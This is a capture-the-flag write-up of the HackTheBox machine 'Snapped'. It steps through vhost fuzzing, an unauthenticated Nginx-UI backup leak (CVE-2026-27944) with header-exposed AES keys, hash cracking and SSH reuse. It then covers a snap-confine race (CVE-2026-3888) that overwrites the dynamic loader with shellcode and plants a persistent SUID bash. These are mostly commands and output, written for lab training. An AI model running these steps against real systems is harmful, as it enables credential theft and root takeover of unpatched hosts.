---
icon: snapchat
cover: ../../../../.gitbook/assets/Screenshot 2026-03-23 205404.png
coverY: -10.582079353376928
---

# HTB-SNAPPED

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

Standard rustscan to start. Nothing fancy, just see what's open.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ rustscan -a 10.129.13.29 blah blah
```

```
Initiating Ping Scan at 20:36
Scanning 10.129.13.29 [4 ports]
Completed Ping Scan at 20:36, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:36
Scanning snapped.htb (10.129.13.29) [1000 ports]
Discovered open port 22/tcp on 10.129.13.29
Discovered open port 80/tcp on 10.129.13.29
Completed SYN Stealth Scan at 20:36, 1.99s elapsed (1000 total ports)
Initiating Service scan at 20:36
Scanning 2 services on snapped.htb (10.129.13.29)
Completed Service scan at 20:36, 6.67s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against snapped.htb (10.129.13.29)
Retrying OS detection (try #2) against snapped.htb (10.129.13.29)
Retrying OS detection (try #3) against snapped.htb (10.129.13.29)
Retrying OS detection (try #4) against snapped.htb (10.129.13.29)
Retrying OS detection (try #5) against snapped.htb (10.129.13.29)
Initiating Traceroute at 20:37
Completed Traceroute at 20:37, 0.14s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:37
Completed Parallel DNS resolution of 1 host. at 20:37, 0.01s elapsed
NSE: Script scanning 10.129.13.29.
Initiating NSE at 20:37
Completed NSE at 20:37, 3.62s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.52s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Nmap scan report for snapped.htb (10.129.13.29)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Snapped \xE2\x80\x94 Infrastructure. Orchestration. Control.
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=3/23%OT=22%CT=1%CU=41884%PV=Y%DS=2%DC=T%G=Y%TM=69C1572
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GC
OS:D=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW9%O2=M552ST11NW9%O3=M552NNT1
OS:1NW9%O4=M552ST11NW9%O5=M552ST11NW9%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE
OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW9%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=
OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 16.781 days (since Sat Mar  7 01:52:49 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   127.28 ms 10.10.14.1
2   127.51 ms snapped.htb (10.129.13.29)

NSE: Script Post-scanning.
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds
           Raw packets sent: 1140 (54.426KB) | Rcvd: 1080 (49.426KB)
```

Two ports. SSH and HTTP. The redirect tells us there's a hostname in play so let's add it to `/etc/hosts` before anything else.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ echo "10.129.13.29 snapped.htb" | sudo tee -a /etc/hosts
```

Hitting the site in a browser shows a pretty standard infrastructure platform landing page "Snapped", some marketing fluff, nothing interactive. The real stuff is almost always hiding behind a vhost so let's fuzz that.

<figure><img src="../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -u http://FUZZ.snapped.htb -ic
```

```
admin    [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 66ms]
```

`admin.snapped.htb` — add it to `/etc/hosts` and go look.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ echo "10.129.13.29 admin.snapped.htb" | sudo tee -a /etc/hosts
```

***

### Foothold CVE-2026-27944 (Nginx-UI Unauthenticated Backup Exfiltration)

The admin subdomain lands on an Nginx-UI login page. No default creds work. Instead of bashing the login form, let's see what API endpoints are actually exposed — Nginx-UI is a known product so there's probably something interesting hiding behind `/api/`.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://admin.snapped.htb/api/FUZZ -ic
```

```
backup      [Status: 200, Size: 18306, Words: 58, Lines: 63, Duration: 81ms]
settings    [Status: 403, Size: 34, Words: 2, Lines: 1, Duration: 63ms]
licenses    [Status: 200, Size: 52782, Words: 9, Lines: 1, Duration: 88ms]
```

`/api/backup` returning 200 with 18KB of content unauthenticated is immediately suspicious. Let's curl it and see what actually comes back.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ curl -v http://admin.snapped.htb/api/backup
```

```
< HTTP/1.1 200 OK
< Content-Type: application/zip
< Content-Disposition: attachment; filename=backup-20260319-121113.zip
< X-Backup-Security: Cp47aVvbLc0r7xMzXABRe86PWv5pu85RmYVXjPFvZDk=:h+CtlLfVQ4/Y152zJ/G46g==
```

<figure><img src="../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

A zip file served without auth, AND the decryption key sitting right there in the response header. This is CVE-2026-27944 Nginx-UI versions up to 2.3.2 expose `/api/backup` without any authentication and helpfully include the AES key and IV in `X-Backup-Security`. The key is `base64(AES-key):base64(IV)`.

Let's grab the backup and decrypt it manually to understand what we're working with.

```git-commit
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ curl -OJ -v http://admin.snapped.htb/api/backup
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0* Host admin.snapped.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.13.29
*   Trying 10.129.13.29:80...
* Established connection to admin.snapped.htb (10.129.13.29 port 80) from 10.10.14.132 port 43988 
* using HTTP/1.x
> GET /api/backup HTTP/1.1
> Host: admin.snapped.htb
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Mon, 23 Mar 2026 15:09:21 GMT
< Content-Type: application/zip
< Content-Length: 18306
< Connection: keep-alive
< Accept-Ranges: bytes
< Cache-Control: must-revalidate
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=backup-20260323-110921.zip
< Content-Transfer-Encoding: binary
< Expires: 0
< Last-Modified: Mon, 23 Mar 2026 15:09:21 GMT
< Pragma: public
< Request-Id: 8cdf691b-9d36-4817-8ac2-ac4ee3003340
< X-Backup-Security: kGv7QUniD76ehBr55hdXqbgb59Td15ADzIhgEVCz9qI=:2ZYDlSzM0WHTCIxotIx+qQ==
< 
{ [12926 bytes data]
100  18306 100  18306   0      0  45424      0                              0
* Connection #0 to host admin.snapped.htb:80 left intact
                        
```

The `X-Backup-Security` header from this request:

```
X-Backup-Security: Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=:Jky/YQ0ISOX3gcTE9lj7zQ==
```

Decode the key and IV from base64, convert to hex for openssl:

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
└─$ iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)
```

Unzip the outer archive, then decrypt the inner `nginx-ui.zip`:

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ unzip -d backup backup-20260319-121723.zip
Archive: backup-20260319-121723.zip
  inflating: backup/hash_info.txt
  inflating: backup/nginx-ui.zip
  inflating: backup/nginx.zip

┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ cd backup
└─$ openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
└─$ unzip nginxui_decrypted.zip
  inflating: app.ini
  inflating: database.db
```

SQLite database. Let's dig into it.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ sqlite3 database.db
sqlite> .tables
sqlite> select * from users;
```

```
1|...|admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|...
2|...|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|...
```

Two bcrypt hashes. The admin one doesn't crack but jonathan's does — bcrypt is hashcat mode 3200.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

```
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

Password reuse check — does `jonathan:linkinpark` work on SSH?

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ ssh jonathan@snapped.htb
jonathan@snapped.htb's password: linkinpark
Welcome to Ubuntu 24.04.4 LTS...
jonathan@snapped:~$
```

***

## Privilege Escalation

### CVE-2026-3888 (snap-confine TOCTOU Race)

First thing I always do after landing a shell is check what's installed and what version things are running.

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

snapd 2.63.1 anything before 2.74.2 is vulnerable to CVE-2026-3888 on Ubuntu 24.04. The short version: `snap-confine` is a SUID-root binary that sets up the sandbox namespace before any snap runs. Part of that setup involves creating "mimics" writable copies of read-only filesystem directories under `/tmp/.snap/`. There's a classic TOCTOU race window between when snap-confine bind-mounts the real library directory into `.snap` and when it bind-mounts the individual entries back out. If you can swap the directory contents in that window, you get attacker-owned files mounted into the namespace as root — including `ld-linux-x86-64.so.2`. Overwrite the dynamic loader with shellcode and any SUID binary in that namespace runs your code as root.

Before attempting the race, check the cleanup timer — the race depends on `.snap` getting cleaned up so we can recreate it as attacker-owned.

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

The timer override runs cleanup every minute, and anything in `/tmp` older than 4 minutes gets wiped. That's deliberately short perfect conditions for the race.

***

#### Setting Up the Race

This exploit requires three coordinated terminals. Here's exactly how I ran it.

**Terminal 1** — Enter the Firefox snap sandbox and note the PID. This keeps the sandbox mount namespace alive while we work.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ ssh jonathan@snapped.htb
jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
jonathan@snapped:/home/jonathan$ cd /tmp
jonathan@snapped:/tmp$ echo $$
9453
jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done
```

The `while` loop keeps `/tmp` active (preventing its deletion) while letting `.snap` go dormant so the cleanup daemon deletes it. Once `.snap` disappears, this loop exits and we're in a clean state.

After about a minute the loop exits. `.snap` is gone.

**Terminal 2** We compiled and uploaded `firefox_2404` (the race helper binary from the writeup) and `librootshell.so` (our shellcode that replaces `ld-linux`) beforehand via scp. Now from Terminal 2, access the sandbox's `/tmp` through `/proc/PID/cwd` — this bypasses the `700 root:root` permissions on `/tmp/snap-private-tmp/` because we're following the process's mount namespace view, not traversing the host path.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ ssh jonathan@snapped.htb

jonathan@snapped:~$ systemd-run --user --scope --unit=snap.d$(date +%s) \
  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd \
  snap.firefox.hook.configure /nonexistent 2>/dev/null; true
```

<figure><img src="../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

This tears down the cached mount namespace (using an invalid `--base snapd`) while preserving `/tmp`. The error is expected — the failure is the point. Now launch the race helper from the sandbox's CWD:

```
jonathan@snapped:~$ cd /proc/9453/cwd
jonathan@snapped:/proc/9453/cwd$ ~/firefox_2404 ~/librootshell.so
```

```
[*] CVE-2026-3888 — firefox 24.04 helper
[*] CWD: /proc/9453/cwd
[*] Setting up .snap and .exchange directory...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[*] Starting race against snap-confine...
[*] Reading snap-confine output (PID 11301)...
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start"...
DEBUG: initializing mount namespace: firefox
...
[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE! Race won.
[*] Do NOT close this terminal.
```

The helper redirects snap-confine's stderr to a tiny AF\_UNIX socket with `SO_RCVBUF=1` and `SO_SNDBUF=1`. This means snap-confine blocks on every single `write()` to stderr until the helper reads one byte effectively single-stepping its execution. When the helper sees the trigger string `dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu"` appear (emitted right after step 1 of the mimic sequence), snap-confine is frozen mid-execution. We have unlimited time to call `renameat2(RENAME_EXCHANGE)` and atomically swap our poisoned directory in. snap-confine resumes and bind-mounts our files as root.

**Terminal 3** — Confirm the race was won (library should now be jonathan-owned), then overwrite the dynamic loader.

```
┌──(sn0x㉿sn0x)-[~/HTB/snapped]
└─$ ssh jonathan@snapped.htb

jonathan@snapped:~$ SPID=$(pgrep -f "sleep 99994" | head -1)
jonathan@snapped:~$ stat -c '%U' /proc/$SPID/root/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
jonathan
```

`jonathan` race won. The namespace is poisoned.

```
jonathan@snapped:~$ cd /proc/$SPID/root
jonathan@snapped:/proc/13354/root$ cp /usr/bin/busybox ./tmp/sh
jonathan@snapped:/proc/13354/root$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

`busybox` as `/tmp/sh` because it's a static binary no dependency on the dynamic loader we just overwrote. `librootshell.so` is our shellcode that does `setreuid(0,0)` + `setregid(0,0)` + `execve("/tmp/sh")` via raw syscalls no libc, no loader dependency.

***

#### Triggering the Root Shell

Back in **Terminal 1** (the sandbox shell that's been sitting there), we now trigger snap-confine inside the poisoned namespace. snap-confine is SUID-root and dynamically linked. The kernel reads `PT_INTERP`, maps our shellcode as the dynamic loader, and executes it with `euid=0`.

```
jonathan@snapped:/proc/9453/cwd$ env -i SNAP_INSTANCE_NAME=firefox \
  /usr/lib/snapd/snap-confine --base core22 \
  snap.firefox.hook.configure \
  /usr/lib/snapd/snap-confine
BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
/var/lib/snapd/void # id
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
```

We're root inside the sandbox. AppArmor allows writes to `/var/snap/firefox/common/` from this profile, so we drop a SUID bash there — it'll persist outside the sandbox with no AppArmor confinement.

```
/var/lib/snapd/void # cp /bin/bash /var/snap/firefox/common/bash
/var/lib/snapd/void # chmod 04755 /var/snap/firefox/common/bash
/var/lib/snapd/void # exit
```

Back in Terminal 1's regular shell (outside the sandbox):

```
jonathan@snapped:~$ /var/snap/firefox/common/bash -p -c 'cat /root/root.txt'
```

Rooted.

***

### Attack Flow

```
snapped.htb (port 80)
        |
        | vhost enum
        v
admin.snapped.htb
        |
        | ffuf /api/FUZZ
        v
/api/backup (no auth) -- CVE-2026-27944
        |
        | X-Backup-Security header leaks AES key+IV
        | backup zip contains database.db
        v
sqlite3 -> users table -> bcrypt hash (jonathan)
        |
        | hashcat -m 3200 -> "linkinpark"
        v
SSH as jonathan
        |
        | snapd 2.63.1 < 2.74.2
        | CVE-2026-3888 TOCTOU race
        |
        | T1: enter firefox snap sandbox (keep namespace alive)
        | wait for .snap deletion (tmpfiles 1min timer, 4min age)
        |
        | T2: destroy cached namespace
        |     run firefox_2404 from /proc/$SANDBOX_PID/cwd
        |     AF_UNIX backpressure single-steps snap-confine
        |     detect trigger -> renameat2(RENAME_EXCHANGE)
        |     race won: attacker-owned libs in namespace
        |
        | T3: overwrite ld-linux-x86-64.so.2 with shellcode
        |     plant busybox as /tmp/sh
        |
        | T1: trigger snap-confine (SUID) inside poisoned namespace
        |     kernel loads our shellcode as dynamic loader -> euid=0
        |     drop SUID bash to /var/snap/firefox/common/bash
        v
/var/snap/firefox/common/bash -p -> root
```

***

### Techniques

| Technique                             | Where Used                                                |
| ------------------------------------- | --------------------------------------------------------- |
| vhost enumeration (ffuf)              | Finding `admin.snapped.htb`                               |
| Unauthenticated API endpoint abuse    | `/api/backup` without auth                                |
| Response header secret leakage        | `X-Backup-Security` leaking AES key+IV                    |
| AES-256-CBC decryption (openssl)      | Decrypting `nginx-ui.zip`                                 |
| SQLite database extraction            | Pulling password hashes from `database.db`                |
| bcrypt cracking (hashcat -m 3200)     | Cracking jonathan's hash to `linkinpark`                  |
| Password reuse                        | SSH login with Nginx-UI credentials                       |
| CVE-2026-27944                        | Nginx-UI unauthenticated backup exfiltration              |
| CVE-2026-3888                         | snap-confine TOCTOU race condition                        |
| TOCTOU race via AF\_UNIX backpressure | Single-stepping snap-confine execution                    |
| `renameat2(RENAME_EXCHANGE)`          | Atomic directory swap during race window                  |
| `/proc/PID/cwd` namespace traversal   | Bypassing `700 root:root` on snap-private-tmp             |
| Dynamic linker hijacking (ld-linux)   | Shellcode execution via SUID snap-confine                 |
| Linux mount namespace manipulation    | Poisoning the Firefox snap's shared library path          |
| SUID bash persistence                 | Escaping AppArmor sandbox via `/var/snap/firefox/common/` |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
